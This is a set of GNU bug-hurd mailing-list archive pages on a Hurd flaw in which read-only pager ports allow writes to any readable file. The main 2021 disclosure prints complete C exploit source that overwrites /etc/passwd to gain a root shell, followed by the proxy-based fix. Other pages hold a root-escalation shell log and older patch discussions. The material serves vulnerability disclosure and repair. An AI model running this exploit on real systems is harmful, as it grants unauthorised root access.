=== Content from www.mail-archive.com_41fa313e_20250115_083146.html ===


[Skip to site navigation (Press enter)](#nav)

# [[VULN 2/4] No read-only mappings](/search?l=bug-hurd@gnu.org&q=subject:%22%5C%5BVULN+2%5C%2F4%5C%5D+No+read%5C-only+mappings%22&o=newest)

[Sergey Bugaev](/search?l=bug-hurd@gnu.org&q=from:%22Sergey+Bugaev%22)
[Tue, 02 Nov 2021 09:37:11 -0700](/search?l=bug-hurd@gnu.org&q=date:20211102)

```
Short description
=================

A single pager port is shared between anyone who mmaps a file, allowing anyone
to modify any files they can read. This can be trivially exploited to get full
root access to the system.
```
```

Background: Mach memory objects
===============================

Mach has the concept of memory objects, also called pagers. A memory object is
essentially a collection of memory pages that can be mapped into a task address
space. Memory objects can be implemented both in userspace or in the kernel.
Like everything else in Mach, a memory object is represented by a port.

A memory object port can be passed to the vm_map () call to map the object to
the address space of a task. Mach itself acts as the client of the memory
object, sending various requests to the object when it needs to read or write
pages of data that belong to the memory object.

An important property of (shared, as in MAP_SHARED) mappings is *coherence*: any
changes made to the data (whether directly through the mapping or through some
other means) must be immediately visible to everyone who has the object mapped.
This basically requires a single set of physical pages to be shared between
tasks, i.e. sharing a single set of physical pages is not only an optimization,
but a hard requirement. Mach takes care to maintain this invariant, and only
keeps a single copy of each logical page of a memory object (unless copying is
requested explicitly).

Background: io_map ()
=====================

On the Hurd, the common way to get a memory object is through the io_map ()
call, defined as follows:

/* Return objects mapping the data underlying this memory object.  If
   the object can be read then memobjrd will be provided; if the
   object can be written then memobjwr will be provided.  For objects
   where read data and write data are the same, these objects will be
   equal, otherwise they will be disjoint.  Servers are permitted to
   implement io_map but not io_map_cntl.  Some objects do not provide
   mapping; they will set none of the ports and return an error.  Such
   objects can still be accessed by io_read and io_write.  */
routine io_map (
        io_object: io_t;
        RPT
        out memobjrd: mach_port_send_t;
        out memobjwt: mach_port_send_t);

io_map () can be called on a file; depending on whether the file was opened for
reading, writing, or both, some of the returned memory objects can be null.

The implementation of mmap () in glibc goes something like this (obviously,
greatly simplified):

mmap (...)
{
  mach_port_t robj, wobj, memobj;

  io_map (io, &robj, &wobj);
  memobj = (prot & PROT_WRITE) ? wobj : robj;

  if (memobj == MACH_PORT_NULL)
    /* The translator doesn't provide this sort of access to us.  */
    return __hurd_fail (EACCES);

  vm_map (mach_task_self (), ..., memobj, ...);
}

The issue
=========

As I mentioned, it's essential for coherence that there's a single copy of each
page in core, shared between all tasks that have it mapped. This is why,
generally, there can only be a single pager per file -- not two distinct pagers
for read-only and writable access!

This means that even when io_map () returns null for a writable memory object,
the returned supposedly read-only memory object is still a port to the same,
single pager for this file, which can be used for both reading and writing.
While an mmap () call will behave as expected -- map the object read-only if so
requested, return an error if asked to make a writable mapping since wobj is
null -- nothing stops an attacker from calling vm_map () explicitly to create a
writable mapping, nor from skipping the actual mapping and just talking to the
pager directly using the port, like Mach would.

The exploit
===========

I can overwrite arbitrary files, at least on the root ext2fs, that I have read
access to. It's trivial to get root access from here. I chose to stick with the
password server and erasing /etc/passwd again. The exploit even makes sure to
restore /etc/passwd contents after getting root, so that the system doesn't end
up in a broken state.

Exploit source code
===================

#include <stdio.h>
#include <error.h>
#include <hurd.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <hurd/paths.h>
#include <hurd/password.h>

int
main ()
{
  error_t err;
  file_t file;
  file_t password_server;
  struct stat64 st;
  mach_port_t robj, wobj;
  vm_address_t addr = 0;
  void *buffer;
  auth_t root_auth;

  file = file_name_lookup ("/etc/passwd", O_READ, 0);
  if (!MACH_PORT_VALID (file))
    error (1, errno, "file_name_lookup");

  password_server = file_name_lookup (_SERVERS_PASSWORD, 0, 0);
  if (!MACH_PORT_VALID (password_server))
    error (1, errno, "file_name_lookup");

  err = io_stat (file, &st);
  if (err)
    error (1, err, "io_stat");

  err = io_map (file, &robj, &wobj);
  if (err)
    error (1, err, "io_map");

  err = vm_map (mach_task_self (),
                &addr, st.st_size, 0,
                1, robj, 0, 0,
                VM_PROT_READ|VM_PROT_WRITE,
                VM_PROT_READ|VM_PROT_WRITE,
                VM_INHERIT_SHARE);
  if (err)
    error (1, err, "vm_map");

  buffer = malloc (st.st_size);
  if (!buffer)
    error (1, errno, "malloc (%lu)", st.st_size);

  memcpy (buffer, (void *) addr, st.st_size);
  memset ((void *) addr, '\n', st.st_size);

  err = password_check_user (password_server, 0, "hax2", &root_auth);
  if (err)
    error (0, err, "password_check_user");
  else
    fprintf (stderr, "Got root auth port :)\n");

  memcpy ((void *) addr, buffer, st.st_size);
  free (buffer);

  err = setauth (root_auth);
  if (err)
    error (1, err, "setauth");

  if (setresuid (0, 0, 0) < 0)
    error (0, errno, "setresuid");
  if (setresgid (0, 0, 0) < 0)
    error (0, errno, "setresgid");

  execl ("/bin/bash", "/bin/bash", NULL);
  error (1, errno, "failed to exec bash");
}

Notes
=====

As it turned out, this vulnerability has been known to (some of) the Hurd
developers before. Specifically, I have found these old discussions on the
mailing list:

* <https://lists.gnu.org/archive/html/bug-hurd/2002-11/msg00263.html>
* <https://lists.gnu.org/archive/html/bug-hurd/2005-06/msg00191.html>

So while I have discovered this vulnerability independently, it is not exactly
new. This also explains the existence of the memory object proxy feature:
proxies turned out to be so convenient for fixing this, it's as if they have
been designed specifically for this use case! -- well, it turns out, they have
been indeed, but the work has never been completed.

Background: memory object proxies
=================================

Memory object proxies are a GNU Mach feature; they're not in other versions of
Mach. They are lightweight references to memory objects that provide a "view"
into their underlying object, while possibly modifying some attributes of the
underlying memory object. Importantly for us, they can modify the allowed
protection.

It's important to understand that memory object proxies are not themselves
memory objects: they don't respond to memory_object_* () RPCs, and in particular
they _don't_ proxy memory_object_* () RPCs to their underlying memory object.

But, memory object proxies can frequently be used _in place of_ an actual memory
object, because vm_map () implementation recognizes memory object proxies and
_actually maps the underlying memory object_, while applying the relevant
attributes of the proxy (namely, adjusting the allowed protection). After the
vm_map () call, the resulting state of the map is indistinguishable from what it
would have been had the underlying memory object been mapped directly, without
using a proxy. In particular, no additional references to the proxy are created,
so the proxy can be safely destroyed afterwards once the userspace no longer
references it.

How we fixed the vulnerability
==============================

By finally making use of memory object proxies!

There's a new function in libpager (the Hurd library for writing pagers),
pager_create_ro_port (), which creates a read-only proxy to the pager; it
complements the existing pager_get_port () function, which gets the actual pager
port. ext2fs, fatfs, and tmpfs were all updated to use pager_create_ro_port ()
to return this read-only proxy when appropriate.

Since it's always the original memory object that's entered into the vm_map, we
can give out read-only pager ports while still keeping the invariant that
there's only one pager, and one copy of each logical page, per file. (To be
clear: this part is not new, it's how proxies work; though we had to make some
tweaks to this mechanism nevertheless.)

We also had to disable the GNU Mach extension that allowed using the "memory
object name port", as returned from vm_region (), in vm_map (). This extension
effectively allowed tasks to remap any objects that they have mapped with a
different protection (and range), circumventing any protection restrictions set
up by proxies (or otherwise by max_protection). This was used by mremap () in
glibc, which as of now no longer works. We have some plans for a different way
to implement mremap () which would be secure (VM proxies).

Before these changes, the proxies feature existed, but it was not used for
anything (outside of Joan Lledó's PCI arbiter memory mapping branch). Now, the
proxies are *pervasively* used when mapping any file read-only (think shared
libraries) and also each time when reading any file from disk, since
_diskfs_rdwr_internal () goes through a mapping.

```

* [Previous message](msg32112.html)
* [View by thread](index.html#32113)
* [View by date](maillist.html#32113)
* [Next message](msg32114.html)

* [[VULN 0/4] Hurd vulnerability details](msg32117.html) Sergey Bugaev
* + [[VULN 3/4] setuid exec race](msg32112.html) Sergey Bugaev
  + [VULN 2/4] No read-only mappings Sergey Bugaev
  + [[VULN 4/4] Process auth man-in-the-middle](msg32114.html) Sergey Bugaev
  + - [Re: [VULN 4/4] Process auth man-in-the-middle](msg32122.html) William ML Leslie
    - * [Re: [VULN 4/4] Process auth man-in-the-midd...](msg32123.html) Samuel Thibault
      * [Re: [VULN 4/4] Process auth man-in-the-midd...](msg32124.html) Samuel Thibault
      * + [Re: [VULN 4/4] Process auth man-in-the-...](msg32125.html) William ML Leslie
        + [Re: [VULN 4/4] Process auth man-in-the-...](msg32126.html) Sergey Bugaev
        + - [Re: [VULN 4/4] Process auth man-in...](msg32127.html) William ML Leslie
          - * [Re: [VULN 4/4] Process auth ma...](msg32128.html) Sergey Bugaev
  + [[VULN 1/4] Fake notifications](msg32116.html) Sergey Bugaev
  + [Re: [VULN 0/4] Hurd vulnerability details](msg32118.html) Samuel Thibault

## Reply via email to

[![The Mail Archive](/logo.png)](/)

Search the site

* [The Mail Archive home](/)
* [bug-hurd - all messages](/bug-hurd%40gnu.org/)
* [bug-hurd - about the list](/bug-hurd%40gnu.org/info.html)
* [Expand](/search?l=bug-hurd@gnu.org&q=subject:%22%5C%5BVULN+2%5C%2F4%5C%5D+No+read%5C-only+mappings%22&o=newest&f=1 "e")
* [Previous message](msg32112.html "p")
* [Next message](msg32114.html "n")

* [The Mail Archive home](/)
* [Add your mailing list](/faq.html#newlist)
* [FAQ](/faq.html)
* [Support](/faq.html#support)
* [Privacy](/faq.html#privacy)
* 20211102163121.415934-3-bugaevc@gmail.com



=== Content from lists.gnu.org_96c30cf5_20250115_083143.html ===


| | **bug-hurd** | | --- | |
| --- | --- |

[[Top](../)][[All Lists](/archive/html)]

[Advanced](/archive/cgi-bin/namazu.cgi?idxname=bug-hurd)

---

[[Date Prev](msg00190.html)][[Date Next](msg00192.html)][[Thread Prev](msg00186.html)][[Thread Next](msg00101.html)][[Date Index](index.html#00191)][[Thread Index](threads.html#00191)]

## Re: [PATCH] proxy memory object

---

| **From**: | Marcus Brinkmann |
| --- | --- |

| **Subject**: | Re: [PATCH] proxy memory object |
| **Date**: | Mon, 13 Jun 2005 12:53:43 +0200 |
| **User-agent**: | Wanderlust/2.10.1 (Watching The Wheels) SEMI/1.14.6 (Maruoka) FLIM/1.14.6 (Marutamachi) APEL/10.6 Emacs/21.4 (i386-pc-linux-gnu) MULE/5.0 (SAKAKI) |

---

```
At Sun, 12 Jun 2005 19:07:52 -0700 (PDT),
Roland McGrath wrote:
>
> > There is something funky about the arrays.  I originally wanted to use
> > "^array[]", but that was a loser.
>
> What was the problem?

I didn't see the right data.

> I haven't played with ^array[], but I know about
> out-of-line parameters generally in the kernel.  The server stub gets
> passed a vm_map_copy_t (cast to io_buf_ptr_t, i.e. char *) when the
> parameter is out of line.You have to use vm_map_copyout on kernel_map to
> look at the contents.

Ah, ok.  That must have been it, I just tried to use the pointer
directly.  Do you think it is worth to go through this trouble here?

> > The patch is tested and seems to work just fine for a single memory
> > object, where offset and start are 0 and len is ~0.
>
> store_map (or store type map hooks) could use this to fabricate a memory
> object for a partitoin or remap store.  That would test some useful cases
> with offsets and limits.  I really think at least some elementary tests of
> the nontrivial arguments should be tested before it goes in.
>
> Hmm, it looks like you haven't implemented that stuff at all, not just not
> tested it.

Right.

> I am a little dubious about putting in the RPC with all those
> args when they aren't implemented.  I suppose there won't be many users to
> change if the signature winds up changing.

Yeah, all-right, but I would be happy if you could make up your mind
on this.  Last time this came up I posted a complete, working patch
with just the args I needed for the simple case.  At that time, Thomas
asked me to modify the prototype to allow for a range restriction, and
you asked me to also take into account multiple objects.

There are three options here, and I don't really care which one we go for:

1. Apply my original patch from Nov 20 2002 (!!!).
   But why didn't we do it 2-and-a-half years ago when I already made
   clear that I won't implement the generic case fully?
2. Apply my new patch, with the generic interface.
3. Somebody commits _now_ to implement the generic case within a reasonably
   short time frame.  I won't do it.

This is, for me, all about fixing a glaring security hole, which has
existed ever since.  Well, since some time it is also about allowing
for tmpfs and shared memory, but that is a side-issue.

Thanks,
Marcus

```

---

reply via email to

---

| [[Prev in Thread](msg00186.html)] | **Current Thread** | [Next in Thread] |
| --- | --- | --- |

* **[[PATCH] proxy memory object](msg00100.html)**, *Marcus Brinkmann*, 2005/06/06
  + **[Re: [PATCH] proxy memory object](msg00186.html)**, *Roland McGrath*, 2005/06/12
    - **Re: [PATCH] proxy memory object**,
      *Marcus Brinkmann* **<=**

---

* Prev by Date:
  **[Featured Equity Profile - no spin or agenda, just the facts](msg00190.html)**
* Next by Date:
  **[director of nursing, director of IT, new 2006 hospital email directory,](msg00192.html)**
* Previous by thread:
  **[Re: [PATCH] proxy memory object](msg00186.html)**
* Next by thread:
  **[(no subject)](msg00101.html)**
* Index(es):
  + [**Date**](index.html#00191)
  + [**Thread**](threads.html#00191)



=== Content from lists.gnu.org_9957dd8f_20250115_083144.html ===


| | **bug-hurd** | | --- | |
| --- | --- |

[[Top](../)][[All Lists](/archive/html)]

[Advanced](/archive/cgi-bin/namazu.cgi?idxname=bug-hurd)

---

[[Date Prev](msg00078.html)][[Date Next](msg00080.html)][[Thread Prev](msg00073.html)][[Thread Next](msg00080.html)][[Date Index](index.html#00079)][[Thread Index](threads.html#00079)]

## How do I disclose a vulnerability?

---

| **From**: | Sergey Bugaev |
| --- | --- |

| **Subject**: | How do I disclose a vulnerability? |
| **Date**: | Fri, 14 May 2021 14:46:36 +0300 |

---

```
As luck would have it, I have found a serious issue in a core
component of the Hurd. It is a denial of service, which can then be
turned into privilege escalation.

I have developed an exploit. Here is it in action:

sergey@sergey-hurd-box:~/hax$ id
uid=1000(sergey) gid=1000(sergey)
groups=1000(sergey),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),103(netdev)
sergey@sergey-hurd-box:~/hax$ ./hax
Got root auth port :)
root@sergey-hurd-box:~/hax# id
uid=0(root) gid=0(root) groups=0(root)
root@sergey-hurd-box:~/hax#

(To be clear, I'm not the first person to realize that, let's say,
_this way of doing things_ could be exploited. I just stumbled on a
piece of code, realized that it uses a problematic pattern, thought of
possible ramifications, and developed the specific exploit.)

As far as I can see from Git history, this vulnerability has been
present in the code base for more than 20 years. Is such a
vulnerability already known (and am I just late to the party)?

If it's not known, how do I responsibly disclose this, so that
nobody's system gets hacked? I guess I could send the vulnerability
description and the exploit source code in a private e-mail; is there
perhaps a dedicated GNU e-mail address for this purpose? How do we
ensure that a future commit fixing the vulnerability doesn't
immediately disclose what it was?

Or, should I just dump the whole thing out in the open on this mailing list?

Should we get a CVE ID assigned? Should we notify Debian?

Sergey

P. S. On a personal note, it has been *very* exciting to find the
issue and develop a successful exploit! But now I'm a bit lost as to
what to do next.

And sorry for throwing more stuff at you. This can certainly wait for
a few more days if it hasn't been discovered for 20 years.

```

---

reply via email to

---

| [Prev in Thread] | **Current Thread** | [[Next in Thread](msg00080.html)] |
| --- | --- | --- |

* **How do I disclose a vulnerability?**,
  *Sergey Bugaev* **<=**
  + **[Re: How do I disclose a vulnerability?](msg00080.html)**, *Samuel Thibault*, 2021/05/14
    - **[Re: How do I disclose a vulnerability?](msg00081.html)**, *Sergey Bugaev*, 2021/05/14
      * **[Re: How do I disclose a vulnerability?](msg00082.html)**, *Samuel Thibault*, 2021/05/14
      * **[Re: How do I disclose a vulnerability?](msg00094.html)**, *Sergey Bugaev*, 2021/05/18

---

* Prev by Date:
  **[Re: rpctrace output improvements?](msg00078.html)**
* Next by Date:
  **[Re: How do I disclose a vulnerability?](msg00080.html)**
* Previous by thread:
  **[rpctrace output improvements?](msg00073.html)**
* Next by thread:
  **[Re: How do I disclose a vulnerability?](msg00080.html)**
* Index(es):
  + [**Date**](index.html#00079)
  + [**Thread**](threads.html#00079)



=== Content from lists.gnu.org_ebe78c9d_20250115_083143.html ===


| | **bug-hurd** | | --- | |
| --- | --- |

[[Top](../)][[All Lists](/archive/html)]

[Advanced](/archive/cgi-bin/namazu.cgi?idxname=bug-hurd)

---

[[Date Prev](msg00262.html)][[Date Next](msg00264.html)][[Thread Prev](msg00255.html)][[Thread Next](msg00256.html)][[Date Index](index.html#00263)][[Thread Index](threads.html#00263)]

## Re: proxy memory objects patch

---

| **From**: | Marcus Brinkmann |
| --- | --- |

| **Subject**: | Re: proxy memory objects patch |
| **Date**: | Thu, 21 Nov 2002 10:32:33 +0100 |
| **User-agent**: | Mutt/1.4i |

---

```
On Wed, Nov 20, 2002 at 09:12:06PM -0500, Roland McGrath wrote:
> > here is my patch for proxy memory objects
>
> Yowza!  Does it actually work?

Yes, it is tested.  I wrote two programs: One calling io_map and mapping the
memobjrd for writing, which is basically an exploit.  The other creates a
proxy memory object restricted to VM_PROT_READ from the memobjrd object, and
then any attempts to write tot he mapped region (mapped with
VM_PROT_READ|VM_PROT_WRITE) segfaults.

Thanks,
Marcus

--
`Rhubarb is no Egyptian god.' GNU      <http://www.gnu.org>    marcus@gnu.org
Marcus Brinkmann              The Hurd <http://www.gnu.org/software/hurd/>
Marcus.Brinkmann@ruhr-uni-bochum.de
<http://www.marcus-brinkmann.de/>

```

---

reply via email to

---

| [[Prev in Thread](msg00255.html)] | **Current Thread** | [[Next in Thread](msg00256.html)] |
| --- | --- | --- |

* **[proxy memory objects patch](msg00247.html)**, *Marcus Brinkmann*, 2002/11/20
  + **[Re: proxy memory objects patch](msg00253.html)**, *Thomas Bushnell, BSG*, 2002/11/20
  + **[Re: proxy memory objects patch](msg00254.html)**, *Thomas Bushnell, BSG*, 2002/11/20
  + **[Re: proxy memory objects patch](msg00255.html)**, *Roland McGrath*, 2002/11/20
    - **Re: proxy memory objects patch**,
      *Marcus Brinkmann* **<=**
  + **[Re: proxy memory objects patch](msg00256.html)**, *Roland McGrath*, 2002/11/20
    - **[Re: proxy memory objects patch](msg00257.html)**, *Thomas Bushnell, BSG*, 2002/11/20
      * **[Re: proxy memory objects patch](msg00258.html)**, *Roland McGrath*, 2002/11/20* **[Re: proxy memory objects patch](msg00261.html)**, *Thomas Bushnell, BSG*, 2002/11/20
    - **[Re: proxy memory objects patch](msg00262.html)**, *Marcus Brinkmann*, 2002/11/21
    - **[Re: proxy memory objects patch](msg00274.html)**, *Marcus Brinkmann*, 2002/11/22
      * **[Re: proxy memory objects patch](msg00280.html)**, *Thomas Bushnell, BSG*, 2002/11/22

---

* Prev by Date:
  **[Re: proxy memory objects patch](msg00262.html)**
* Next by Date:
  **[Re: Visual bell](msg00264.html)**
* Previous by thread:
  **[Re: proxy memory objects patch](msg00255.html)**
* Next by thread:
  **[Re: proxy memory objects patch](msg00256.html)**
* Index(es):
  + [**Date**](index.html#00263)
  + [**Thread**](threads.html#00263)


